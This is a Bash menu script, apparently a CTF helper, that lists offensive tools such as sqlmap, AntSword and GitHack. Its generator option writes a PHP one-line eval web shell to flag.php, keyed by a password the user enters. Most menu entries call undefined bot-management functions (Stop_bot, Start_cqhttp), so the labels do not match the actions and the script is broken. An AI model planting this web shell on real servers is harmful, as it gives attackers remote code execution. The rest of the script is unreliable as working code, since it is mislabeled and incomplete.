#! /bin/bash
root=`pwd`
sh_ver="1.0"
# echo $root
# read -p "请输入：" -e msg
# echo $msg

Green_font_prefix="\033[32m" && Red_font_prefix="\033[31m" && Red_background_prefix="\033[41;37m" && Font_color_suffix="\033[0m"
Info="${Green_font_prefix}[信息]${Font_color_suffix}"
Error="${Red_font_prefix}[错误]${Font_color_suffix}"
Tip="${Green_font_prefix}[注意]${Font_color_suffix}"

menu(){
  echo && echo -e "  CTFToolsHelps ${Red_font_prefix}[v${sh_ver}]${Font_color_suffix}
  -- jnuse | github.com/jnuse --
 ${Green_font_prefix} 0.${Font_color_suffix} 生成器
 ${Green_font_prefix} 1.${Font_color_suffix} sqlmap
 ${Green_font_prefix} 2.${Font_color_suffix} xray
 ${Green_font_prefix} 3.${Font_color_suffix} xxe
 ${Green_font_prefix} 4.${Font_color_suffix} AntSword
 ${Green_font_prefix} 5.${Font_color_suffix} DS_Store
 ${Green_font_prefix} 6.${Font_color_suffix} dvcs-ripper
 ${Green_font_prefix} 7.${Font_color_suffix} flask_pin
 ${Green_font_prefix} 8.${Font_color_suffix} GitHack
 ${Green_font_prefix}10.${Font_color_suffix} SSTImap" && echo
 
  read -erp " 请输入数字:" num
  case "$num" in
  0)
    generator
    ;;
  1)
    Stop_bot
    Stop_cqhttp
    ;;
  2)
    Start_cqhttp
    ;;
  3)
    Stop_cqhttp
    ;;
  4)
    Restart_cqhttp
    ;;
  5)
    Start_bot
    ;;
  6)
    Stop_bot
    ;;
  7)
    Restart_bot
    ;;  
  8)
    View_cqhttp_log
    ;;
  10)
    View_bot_log
    ;;
  *)
    echo "请输入正确数字"
    ;;
  esac
 
}
generator(){
  echo && echo -e "  CTFToolsHelps ${Red_font_prefix}[v${sh_ver}]${Font_color_suffix}
  -- jnuse | github.com/jnuse --
 ${Green_font_prefix} 0.${Font_color_suffix} 生成PHP一句话木马
 ${Green_font_prefix} 1.${Font_color_suffix} 生成png图片马" && echo
 
  read -erp " 请输入数字:" num
  case "$num" in
  0)
    read -erp " 请输入密码:" cmd
    echo "<?php @eval(\$_POST['$cmd']);?>" > flag.php
    echo -e "$Info: $root/flag.php"
    ;;
  1)
    Stop_bot
    Stop_cqhttp
    ;;
  *)
    echo "请输入正确数字"
    ;;
  esac
 
}
menu